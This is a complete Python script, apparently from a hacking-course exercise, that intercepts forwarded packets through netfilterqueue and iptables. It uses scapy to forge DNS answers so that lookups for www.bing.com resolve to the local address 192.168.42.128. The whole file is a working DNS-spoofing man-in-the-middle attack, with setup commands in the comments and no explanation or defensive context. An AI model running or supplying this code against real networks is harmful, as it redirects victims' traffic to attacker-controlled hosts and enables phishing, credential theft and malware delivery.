#!usr/bin/env python3

# iptables -I FORWARD -j NFQUEUE --queue-num [queueNum]
# iptables --flush

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapyPacket = scapy.IP(packet.get_payload())
    if scapyPacket.haslayer(scapy.DNSRR):
        qname = str(scapyPacket[scapy.DNSQR].qname)
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.42.128")
            scapyPacket[scapy.DNS].an = answer
            scapyPacket[scapy.DNS].ancount = 1
            
            del scapyPacket[scapy.IP].len
            del scapyPacket[scapy.IP].chksum
            del scapyPacket[scapy.UDP].len
            del scapyPacket[scapy.UDP].chksum
            
            packet.set_payload(bytes(scapyPacket))
            
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) # 0 is [queueNum]
queue.run()